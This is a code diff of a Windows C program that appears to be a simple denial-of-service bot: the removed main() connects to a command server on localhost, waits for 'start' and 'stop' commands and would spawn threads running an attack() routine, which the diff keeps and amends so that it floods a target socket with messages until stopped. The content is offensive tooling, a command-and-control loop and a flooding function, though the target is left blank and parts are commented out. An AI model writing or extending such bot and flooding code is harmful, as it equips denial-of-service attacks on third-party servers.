@@ -5,68 +5,8 @@
 #include <ws2tcpip.h>
 #include <windows.h>
 #include <winuser.h>
+#include "utils.h"
 
-void startWinsock(WSADATA *wsaData);
-SOCKET startSocket();
-void connectSocket(struct sockaddr_in *serv_addr, SOCKET client_socket,  const char* server_ip);
-void sendMsg(SOCKET client_socket, const char *msg);
-void closeSocket(SOCKET client_socket);
-DWORD WINAPI attack(LPVOID target_ip);
-void receiveCommand(SOCKET client_socket, char *cmd);
-
-struct address{
-    const char* ip;
-    int port;
-};
-
-volatile int running = 0;
-
-int main() {
-
-    char cmd_buff[1024];
-    char output_buff[1024]; 
-
-    // server socket details and setup
-    SOCKET server_socket;
-    struct sockaddr_in serv_addr;
-    WSADATA wsaData;
-    serv_addr.sin_family = AF_INET;
-    serv_addr.sin_port = htons(8080);
-    const char* server_ip = "127.0.0.1";
-
-    startWinsock(&wsaData);
-    server_socket = startSocket();
-    connectSocket(&serv_addr, server_socket, server_ip);
-
-    while (1) {
-        memset(cmd_buff, 0, 1024);
-        memset(output_buff, 0, 1024);
-        receiveCommand(server_socket, cmd_buff);
-
-        if (strcmp(cmd_buff, "start") == 0){
-            struct address target_addr;
-            target_addr.ip = "";
-            target_addr.port = 80;
-            printf("Executing attack...\n");
-            // for (int i=0; i<50; i++){
-            //     HANDLE attack_thread = CreateThread(NULL, 0, attack, (LPVOID)&target_addr, 0, NULL);
-            //     // printf("Thread created");
-            //     if (attack_thread == NULL){
-            //         printf("error creating thread \n");
-            //     }
-            // }
-            // while (1){
-            //     ;
-            // }
-        } else if (strcmp(cmd_buff, "stop") == 0){
-            printf("Stopping attack...\n");
-            // closeSocket(server_socket);
-            // break;
-        }
-    }
-
-    return 0;
-}
 
 DWORD WINAPI attack(LPVOID addr){
     struct address target = *(struct address*)addr;
@@ -87,9 +27,11 @@ DWORD WINAPI attack(LPVOID addr){
         if (running){
             sendMsg(target_socket, msg);
         } else {
-            ;
+            break;
         }
     }
+    closeSocket(target_socket);
+    return 0;
 }
 
 // function to initialize Winsock so that we can use sockets
